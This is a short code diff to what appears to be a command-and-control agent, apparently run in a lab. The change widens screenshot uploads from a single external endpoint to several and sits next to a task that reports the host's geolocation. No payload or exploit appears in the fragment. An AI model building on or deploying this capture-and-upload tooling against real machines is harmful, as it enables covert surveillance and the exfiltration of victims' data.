@@ -286,8 +286,9 @@ async function main() {
   if (cfg.enableGeolocate) {
     logger.warn('enableGeolocate is ON — the geolocate task discloses this host\'s location over the channel');
   }
-  if (cfg.uploadUrl) {
-    logger.warn(`uploadUrl is set (${cfg.uploadUrl}) — screenshot bytes leave the lab to an external service`);
+  if (cfg.uploadUrl || cfg.uploadUrls.length > 0) {
+    const endpoints = [...cfg.uploadUrls, ...(cfg.uploadUrl ? [cfg.uploadUrl] : [])];
+    logger.warn(`upload endpoints configured (${endpoints.join(', ')}) — screenshot bytes leave the lab to external services`);
   }
   if (!cfg.token) {
     logger.warn('NPM_C2_TOKEN is not set — result publishing will fail with 401');
@@ -342,6 +343,7 @@ async function main() {
           enableScreenshot: cfg.enableScreenshot,
           screenshotMaxWidth: cfg.screenshotMaxWidth,
           uploadUrl: cfg.uploadUrl,
+          uploadUrls: cfg.uploadUrls,
           enableGeolocate: cfg.enableGeolocate,
           geolocateServiceUrl: cfg.geolocateServiceUrl,
           geolocateServiceKey: cfg.geolocateServiceKey,
